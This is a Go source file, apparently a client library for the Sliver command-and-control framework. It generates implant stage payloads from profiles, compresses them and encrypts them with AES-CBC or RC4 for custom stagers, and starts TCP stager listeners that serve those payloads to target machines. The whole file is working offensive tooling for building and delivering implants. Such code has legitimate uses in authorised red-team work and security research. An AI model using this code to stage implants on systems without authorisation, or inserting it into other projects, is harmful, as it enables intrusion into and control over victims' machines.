package sliver

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"compress/zlib"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
)

// StageGenerateRequest builds / optionally encrypts a stage from a profile.
type StageGenerateRequest struct {
	Profile      string `json:"profile"`
	Name         string `json:"name"`
	AESKey       string `json:"aes_key"`
	AESIV        string `json:"aes_iv"`
	RC4Key       string `json:"rc4_key"`
	Compress     string `json:"compress"`
	PrependSize  bool   `json:"prepend_size"`
	ReturnCipher bool   `json:"return_cipher"` // if true, return encrypted bytes (RPC File is plaintext)
}

// StageGenerateResult is the downloadable stage blob.
type StageGenerateResult struct {
	FileName    string `json:"filename"`
	DataB64     string `json:"data_b64"`
	Size        int    `json:"size"`
	Profile     string `json:"profile"`
	Encrypted   bool   `json:"encrypted"`
	Compress    string `json:"compress,omitempty"`
	AESKey      string `json:"aes_key,omitempty"` // echo only when generated/used; caller must not persist
	AESIV       string `json:"aes_iv,omitempty"`
	RC4Key      string `json:"rc4_key,omitempty"`
	ImplantName string `json:"implant_name,omitempty"`
	PrependSize bool   `json:"prepend_size"`
}

// StageListenerRequest starts a TCP stage listener (Sliver 1.7 TCP-only path).
type StageListenerRequest struct {
	URL      string `json:"url"` // tcp://host:port
	Profile  string `json:"profile"`
	AESKey   string `json:"aes_key"`
	AESIV    string `json:"aes_iv"`
	RC4Key   string `json:"rc4_key"`
	Compress string `json:"compress"`
}

// StageListenerView is the JSON shape for an active stage listener job.
type StageListenerView struct {
	JobID    uint32 `json:"job_id"`
	Name     string `json:"name"`
	Protocol string `json:"protocol"`
	Port     uint32 `json:"port"`
	IsStage  bool   `json:"is_stage"`
}

// ListStageListeners returns all jobs that look like TCP stage listeners.
// Sliver names stager jobs with "stager" in the job name, and they always
// use protocol "tcp". We filter by both conditions (either is sufficient)
// so the list survives minor Sliver server naming changes.
func (c *Client) ListStageListeners() ([]StageListenerView, error) {
	jobs, err := c.Jobs()
	if err != nil {
		return nil, err
	}
	out := make([]StageListenerView, 0)
	for _, j := range jobs {
		isStage := strings.EqualFold(j.Type, "tcp") ||
			strings.Contains(strings.ToLower(j.Name), "stage")
		if !isStage {
			continue
		}
		out = append(out, StageListenerView{
			JobID:    j.ID,
			Name:     j.Name,
			Protocol: j.Type,
			Port:     j.Port,
			IsStage:  true,
		})
	}
	return out, nil
}

// StageListenerResult is the started job.
type StageListenerResult struct {
	JobID   uint32 `json:"job_id"`
	Host    string `json:"host"`
	Port    uint32 `json:"port"`
	Profile string `json:"profile"`
	AESKey  string `json:"aes_key,omitempty"`
	AESIV   string `json:"aes_iv,omitempty"`
	RC4Key  string `json:"rc4_key,omitempty"`
	Size    int    `json:"payload_size"`
}

// GenerateStage calls Sliver GenerateStage then optionally re-applies
// compress/encrypt locally so the returned bytes match what operators expect
// for custom stagers (upstream RPC File.Data is the pre-encrypt build).
func (c *Client) GenerateStage(req *StageGenerateRequest) (*StageGenerateResult, error) {
	if req == nil || strings.TrimSpace(req.Profile) == "" {
		return nil, fmt.Errorf("profile is required")
	}
	if req.AESKey != "" && req.RC4Key != "" {
		return nil, fmt.Errorf("cannot use both AES and RC4 encryption")
	}
	aesKey, aesIV, err := normalizeAES(req.AESKey, req.AESIV)
	if err != nil {
		return nil, err
	}
	if err := validateRC4(req.RC4Key); err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()
	resp, err := c.RPC.GenerateStage(ctx, &clientpb.GenerateStageReq{
		Profile:       req.Profile,
		Name:          req.Name,
		AESEncryptKey: aesKey,
		AESEncryptIv:  aesIV,
		RC4EncryptKey: req.RC4Key,
		PrependSize:   req.PrependSize,
		Compress:      req.Compress,
	})
	if err != nil {
		return nil, err
	}
	if resp.File == nil {
		return nil, fmt.Errorf("generate stage returned empty file")
	}

	data := append([]byte(nil), resp.File.Data...)
	encrypted := false
	compress := strings.ToLower(strings.TrimSpace(req.Compress))

	// Upstream saves encrypted stage server-side but returns plaintext File.Data.
	// When the operator wants ciphertext for a custom stager, re-apply locally.
	if req.ReturnCipher || aesKey != "" || req.RC4Key != "" || compress != "" {
		var prepErr error
		data, encrypted, prepErr = prepareStagePayload(data, compress, aesKey, aesIV, req.RC4Key, req.PrependSize)
		if prepErr != nil {
			return nil, prepErr
		}
	}

	return &StageGenerateResult{
		FileName:    resp.File.Name,
		DataB64:     encodeBase64(data),
		Size:        len(data),
		Profile:     req.Profile,
		Encrypted:   encrypted,
		Compress:    compress,
		AESKey:      aesKey,
		AESIV:       aesIV,
		RC4Key:      req.RC4Key,
		ImplantName: resp.ImplantName,
		PrependSize: req.PrependSize,
	}, nil
}

// StartTCPStageListener builds stage bytes from a profile and starts a TCP stager job.
func (c *Client) StartTCPStageListener(req *StageListenerRequest) (*StageListenerResult, error) {
	if req == nil || strings.TrimSpace(req.Profile) == "" {
		return nil, fmt.Errorf("profile is required")
	}
	if strings.TrimSpace(req.URL) == "" {
		return nil, fmt.Errorf("url is required (tcp://host:port)")
	}
	if req.AESKey != "" && req.RC4Key != "" {
		return nil, fmt.Errorf("cannot use both AES and RC4 encryption")
	}

	u, err := url.Parse(req.URL)
	if err != nil {
		return nil, fmt.Errorf("invalid url: %w", err)
	}
	if !strings.EqualFold(u.Scheme, "tcp") {
		return nil, fmt.Errorf("only tcp:// stage listeners are supported by Sliver 1.7 StartTCPStagerListener (got %s)", u.Scheme)
	}
	host := u.Hostname()
	if host == "" {
		host = "0.0.0.0"
	}
	port64, err := strconv.ParseUint(u.Port(), 10, 32)
	if err != nil || port64 == 0 {
		return nil, fmt.Errorf("url must include a valid port")
	}
	port := uint32(port64)

	aesKey, aesIV, err := normalizeAES(req.AESKey, req.AESIV)
	if err != nil {
		return nil, err
	}
	if err := validateRC4(req.RC4Key); err != nil {
		return nil, err
	}

	raw, err := c.generateProfileBinary(req.Profile)
	if err != nil {
		return nil, err
	}
	compress := strings.ToLower(strings.TrimSpace(req.Compress))
	payload, _, err := prepareStagePayload(raw, compress, aesKey, aesIV, req.RC4Key, true)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	resp, err := c.RPC.StartTCPStagerListener(ctx, &clientpb.StagerListenerReq{
		Protocol:    clientpb.StageProtocol_TCP,
		Host:        host,
		Port:        port,
		Data:        payload,
		ProfileName: req.Profile,
	})
	if err != nil {
		return nil, err
	}
	return &StageListenerResult{
		JobID:   resp.GetJobID(),
		Host:    host,
		Port:    port,
		Profile: req.Profile,
		AESKey:  aesKey,
		AESIV:   aesIV,
		RC4Key:  req.RC4Key,
		Size:    len(payload),
	}, nil
}

func (c *Client) generateProfileBinary(profileName string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()
	profiles, err := c.RPC.ImplantProfiles(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	var cfg *clientpb.ImplantConfig
	for _, p := range profiles.GetProfiles() {
		if p != nil && p.Name == profileName {
			cfg = p.Config
			break
		}
	}
	if cfg == nil {
		return nil, fmt.Errorf("implant profile %q not found", profileName)
	}
	gen, err := c.RPC.Generate(ctx, &clientpb.GenerateReq{Config: cfg})
	if err != nil {
		return nil, err
	}
	if gen.File == nil || len(gen.File.Data) == 0 {
		return nil, fmt.Errorf("profile generate returned empty implant")
	}
	return gen.File.Data, nil
}

func prepareStagePayload(data []byte, compress, aesKey, aesIV, rc4Key string, prependSize bool) ([]byte, bool, error) {
	out := append([]byte(nil), data...)
	var err error
	switch compress {
	case "", "none":
		// no-op
	case "zlib":
		var buf bytes.Buffer
		w := zlib.NewWriter(&buf)
		if _, err = w.Write(out); err != nil {
			_ = w.Close()
			return nil, false, err
		}
		if err = w.Close(); err != nil {
			return nil, false, err
		}
		out = buf.Bytes()
	case "gzip":
		var buf bytes.Buffer
		w := gzip.NewWriter(&buf)
		if _, err = w.Write(out); err != nil {
			_ = w.Close()
			return nil, false, err
		}
		if err = w.Close(); err != nil {
			return nil, false, err
		}
		out = buf.Bytes()
	case "deflate", "deflate9":
		var buf bytes.Buffer
		level := flate.DefaultCompression
		if compress == "deflate9" {
			level = flate.BestCompression
		}
		w, err := flate.NewWriter(&buf, level)
		if err != nil {
			return nil, false, err
		}
		if _, err = w.Write(out); err != nil {
			_ = w.Close()
			return nil, false, err
		}
		if err = w.Close(); err != nil {
			return nil, false, err
		}
		out = buf.Bytes()
	default:
		return nil, false, fmt.Errorf("unsupported compress %q (zlib|gzip|deflate|deflate9)", compress)
	}

	encrypted := false
	if aesKey != "" {
		out = preludeEncrypt(out, []byte(aesKey), []byte(aesIV))
		if len(out) == 0 {
			return nil, false, fmt.Errorf("AES encrypt failed")
		}
		encrypted = true
	}
	if rc4Key != "" {
		out = rc4Encrypt(out, []byte(rc4Key))
		encrypted = true
	}
	if prependSize {
		out = prependPayloadSize(out)
	}
	return out, encrypted, nil
}

func normalizeAES(key, iv string) (string, string, error) {
	key = strings.TrimSpace(key)
	iv = strings.TrimSpace(iv)
	if key == "" {
		return "", "", nil
	}
	// AES-128/192/256 — key bytes are the raw string (Sliver CLI convention), not hex-decoded.
	switch len(key) {
	case 16, 24, 32:
		// ok
	default:
		return "", "", fmt.Errorf("AES key must be 16, 24, or 32 bytes (got %d); use ASCII like 0123456789ABCDEF, not hex encoding of a shorter key", len(key))
	}
	if iv == "" {
		iv = "0000000000000000"
	}
	// NewCBCEncrypter requires IV length == aes.BlockSize (16). Longer IVs panic in crypto/cipher.
	if len(iv) != aes.BlockSize {
		return "", "", fmt.Errorf("AES IV must be exactly %d bytes (got %d)", aes.BlockSize, len(iv))
	}
	return key, iv, nil
}

func validateRC4(key string) error {
	if key == "" {
		return nil
	}
	if len(key) < 1 || len(key) > 256 {
		return fmt.Errorf("RC4 key length must be 1–256 bytes (got %d)", len(key))
	}
	return nil
}

func prependPayloadSize(payload []byte) []byte {
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(payload)))
	return append(lenBuf, payload...)
}

// preludeEncrypt mirrors sliver/util.PreludeEncrypt (AES-CBC + PKCS7, IV prepended).
func preludeEncrypt(data, key, iv []byte) []byte {
	plainText, err := pkcs7Pad(data, aes.BlockSize)
	if err != nil {
		return nil
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	cipherText := make([]byte, aes.BlockSize+len(plainText))
	if len(iv) == 0 {
		iv = cipherText[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			return nil
		}
	} else {
		copy(cipherText[:aes.BlockSize], iv)
		iv = cipherText[:aes.BlockSize]
	}
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(cipherText[aes.BlockSize:], plainText)
	return cipherText
}

func pkcs7Pad(buf []byte, size int) ([]byte, error) {
	bufLen := len(buf)
	padLen := size - bufLen%size
	padded := make([]byte, bufLen+padLen)
	copy(padded, buf)
	for i := 0; i < padLen; i++ {
		padded[bufLen+i] = byte(padLen)
	}
	return padded, nil
}

func rc4Encrypt(data, key []byte) []byte {
	// Match sliver util.RC4EncryptUnsafe: standard RC4 keystream XOR.
	s := make([]byte, 256)
	for i := 0; i < 256; i++ {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}
	out := make([]byte, len(data))
	i, j := 0, 0
	for n := 0; n < len(data); n++ {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		out[n] = data[n] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return out
}
